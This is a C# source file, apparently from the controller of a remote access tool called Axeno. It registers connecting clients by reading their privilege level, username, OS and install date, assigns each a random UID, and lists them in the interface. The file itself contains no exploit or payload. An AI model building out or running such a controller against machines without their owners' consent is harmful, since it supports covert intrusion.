using Axeno.Helper;
using Axeno.MessagePack;
using Axeno.Networking.Connection;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace Axeno.Networking.Communication
{
    internal class HandleListView
    {
        public void AddItem(Client cli, MsgPack msgpck)
        {
            string group = msgpck.ForcePathObject("Group").AsString;
            string permissions = msgpck.ForcePathObject("Applevel").AsString;
            string installdate = msgpck.ForcePathObject("Instdate").AsString;
            string username = msgpck.ForcePathObject("Username").AsString;
            string os = msgpck.ForcePathObject("Operatingsystem").AsString;
            string version = msgpck.ForcePathObject("Version").AsString;
            string clientuid = msgpck.ForcePathObject("UID").AsString;
            if(clientuid == "N/A")
            {
                clientuid = GetUID();
                cli.Send(SendUID(clientuid));
            }
            ClientsLV thisclient = new ClientsLV();
            thisclient.uid = clientuid;
            thisclient.version = version;
            thisclient.groupName = group;
            thisclient.appLevel = permissions;
            thisclient.installDate = installdate;
            thisclient.clientName = username;
            thisclient.Client = cli;
            thisclient.operatingSystem = os;
            thisclient.ping = "N/A";
            cli.CurrentClient = thisclient;

            MainWindowSlides.lvClients.Items.Add(thisclient);

        }
        private static Random random = new Random();

        public string GetUID()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, 6)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public byte[] SendUID(string uid)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientUID";
            msgpack.ForcePathObject("UID").AsString = uid;
            return msgpack.Encode2Bytes();
        }
    }
}
